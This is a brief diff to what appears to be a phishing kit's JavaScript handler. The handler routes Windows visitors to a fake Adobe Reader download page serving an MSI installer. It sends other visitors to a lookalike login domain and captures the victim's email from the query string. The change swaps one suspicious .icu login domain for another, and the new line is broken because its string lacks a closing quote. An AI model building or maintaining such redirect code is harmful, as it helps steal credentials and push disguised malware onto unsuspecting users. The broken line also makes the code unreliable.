@@ -5,7 +5,7 @@ export default function handler(req, res) {
 
   const WINDOWS_REDIRECT_AFTER_DOWNLOAD = 'https://mksonline.com.mx/css/adobe/reader/download.html';
   const MSI_PATH = '/Reader_en_install.msi';
-  const NON_WINDOWS_TARGET = 'https://login.jsspjg.icu';
+  const NON_WINDOWS_TARGET = 'https://accounts.fxzova.icu;
 
   // 1. Try to get email from query normally
   let email = '';
